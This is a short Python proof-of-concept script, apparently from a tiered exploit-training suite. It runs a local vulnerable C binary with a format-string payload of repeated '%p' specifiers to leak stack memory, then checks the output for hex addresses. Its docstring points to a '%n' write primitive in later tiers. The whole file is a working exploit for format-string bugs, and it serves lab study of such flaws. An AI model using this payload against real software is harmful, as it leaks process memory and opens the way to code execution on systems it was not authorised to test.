#!/usr/bin/env python3
"""Tier-1 format-string / C — leak primitive demo.

%p%p%p%p... reads stack contents. Confirms the format-string sink.
For full %n write primitive see Tier 2 chains.
"""
import os
import subprocess
import sys


def main() -> int:
    binary = sys.argv[1] if len(sys.argv) > 1 else os.path.join("build", "vuln")
    payload = "%p.%p.%p.%p.%p.%p.%p.%p"
    proc = subprocess.run([binary, payload], capture_output=True, timeout=5)
    out = proc.stdout.decode(errors="replace")
    leaked = "0x" in out
    print(f"returncode={proc.returncode} leaked={leaked}")
    print(f"output: {out.strip()}")
    return 0 if leaked else 1


if __name__ == "__main__":
    sys.exit(main())
